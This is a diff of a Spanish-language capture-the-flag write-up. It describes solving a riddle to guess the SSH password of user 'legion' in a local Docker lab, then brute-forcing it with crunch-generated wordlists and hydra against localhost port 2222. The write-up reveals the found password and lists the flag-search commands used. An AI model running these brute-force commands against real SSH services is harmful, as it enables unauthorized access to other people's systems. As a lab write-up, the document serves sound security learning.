@@ -1,68 +1,117 @@
 # 🛡️ Reto CTF: Ubuntu con SSH y Usuario 'Legion'
 
 ## 🎯 Objetivo
-Acceder vía SSH a un contenedor Docker con usuario `legion`, cuya contraseña debe ser descubierta a través de fuerza bruta basada en un acertijo. Se utilizaron herramientas como `crunch` e `hydra` para automatizar el proceso.
+*Acceder vía SSH a un contenedor Docker con usuario `legion`, cuya contraseña debe ser descubierta a través de fuerza bruta basada en un acertijo. Se utilizaron herramientas como `crunch` e `hydra` para automatizar el proceso.*
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## 🧱 1. Preparación del entorno
 
-### Descargar imagen del contenedor
+![Alistamiento](Images/soldat-soldier.gif)
+
+### *Descargar imagen del contenedor*
+
 ```bash
 docker pull jaiderospina/retoctf:1.0
+```
 
-Ejecutar contenedor en segundo plano
+### *Ejecutar contenedor en segundo plano*
 
-
+```bash
 docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0
-Solución a conflicto de nombre
+```
+![exe contenedor](Images/1.%20exe%20cont%20.png)
 
+###  *Solución a conflicto de nombre* 
 
+```bash
 docker rm -f mi-contenedor-ssh
-
+```
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-🔍 2. Verificación del contenedor
+## 🔍 2. Verificación del contenedor
 
-
+```bash
 docker ps
-Confirmó contenedor activo y SSH escuchando en puerto 2222.
+```
+
+*Se confirmó contenedor activo y SSH escuchando en puerto 2222.*
+
+![verif contenedor](Images/2.%20verif%20cont%20.png)
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-🧠 3. Análisis del acertijo
-Cinco letras ocultas en las palabras estrella, selva, dedo, gato...
-Hipótesis principal: combinación tipo esdeg, ESDEG, etc.
+## 🧠 3. Análisis del acertijo
+
+### *Acertijo:*
+
+*Your content *Cinco guardianes vigilantes,*  
+*cada uno con su inicial,*  
+*la primera se esconde en estrella,*  
+*la segunda en la selva tropical,*  
+*tercera y cuarta van seguidas,*  
+*ambas en dedo se dejan hallar,*  
+*la última es misteriosa,*  
+*y en gato suena al final.*  
+*Juntas caminan siempre en fila.*
+
+### *Análisis:*
+
+***Pista:** Cinco letras ocultas y podría existir relación con las iniciales.*
+
+
+| Posición | Palabra   |Letra identificada |
+|----------|-----------|-------------------|
+| 1        | estrella  |      **e**        |
+| 2        | selva     |      **s**        |
+| 3 y 4    | dedo      |   **d**-**e**     |
+| 5        | gato      |      **g**        |
+
+*Siguiendo las instrucciones del acertijo y analizando el contexto se llegó a una hipótesis.*
+
+**Hipótesis principal**: combinación posible **esdeg**, **ESDEG**, etc.
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-🧰 4. Generación de diccionarios con Crunch
-Lista basada en patrón:
+## 🧰 4. Generación de diccionarios con Crunch
 
+### *Lista basada en patrón:*
 
 crunch 5 5 -t ES%%O -o esdeo.lst
-Lista reducida:
 
+![Crunch](Images/4.%20crunch%20+%20hydra%201%20.png)
+
+### *Lista reducida:*
 
 crunch 5 5 estdgo -o reducido.lst
-Lista ampliada:
 
+![Crunch](Images/4.1%20crunch%20+%20hydra%202%20.png)
+
+### *Lista ampliada:*
 
 crunch 5 5 estdogal -o ampliada.lst
-Lista completa (opcional):
+
+![Crunch](Images/4.2%20hydra%20.png)
+
+### *Lista completa:*
 
 
 crunch 5 5 abcdefghijklmnopqrstuvwxyz -o full.lst
 
+![Crunch](Images/4.3%20crunch%20+%20hydra%203%20.png)
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-⚔️ 5. Ataques con Hydra
-Comando base usado:
+## ⚔️ 5. Ataques con Hydra
+
+## *Comando base usado:*
 
 
-
+```bash
 hydra -t 4 -l legion -P [archivo] -s 2222 localhost ssh
-Diccionarios probados:
+```
+
+## *Diccionarios probados:*
 
 esdeo.lst ❌
 
@@ -72,41 +121,48 @@ ampliada.lst ❌
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-👣 6. Verificación manual de servicio SSH
+## 👣 6. Verificación manual de servicio SSH
 
-
+```bash
 ssh legion@localhost -p 2222
 Confirmado: SSH activo y pidiendo contraseña.
+```
+
+![Acces Denied](Images/request-denied-thumbs-down.gif)
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-🎯 7. Ataque exitoso con combinaciones personalizadas
-Crear wordlist:
+## 🎯 7. Ataque exitoso con combinaciones personalizadas
 
+### *Crear wordlist:*
 
+```bash
 echo -e "esdeg\nESDEG\nEsdeg\neSdeg\nesDEG\neSdEg\nEsDEg\nESDeg\nesDEg\nEsdEg" > combinadas.lst
-Ejecutar Hydra:
+```
+### *Ejecutar Hydra:*
 
-
+```bash
 hydra -l legion -P combinadas.lst -s 2222 localhost ssh
+```
 
-✅ Resultado:
+![Bang](Images/7.1%20BANG!%20.avif)
+
+## ✅ Resultado:
 
 css
-
 
 [22][ssh] host: localhost login: legion password: Esdeg
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-🔐 8. Acceso SSH exitoso
+## 🔐 8. Acceso SSH exitoso
 
 
 ssh legion@localhost -p 2222
 # Contraseña: Esdeg
 🕵️ 9. Búsqueda de bandera
-Comandos usados:
 
+## *Comandos usados:*
 
 ls -la
 cat flag.txt
@@ -114,9 +170,9 @@ find / -name "*flag*" 2>/dev/null
 cat /etc/motd
 grep -r "CTF{" /home 2>/dev/null
 
-❌ No se encontró bandera explícita en el contenedor.
+## ❌ No se encontró bandera explícita en el contenedor.
 
-🧠 Lecciones aprendidas
+## 🧠 Lecciones aprendidas
 Uso táctico de crunch para generar diccionarios.
 
 Dominio de hydra con control de tareas (-t).
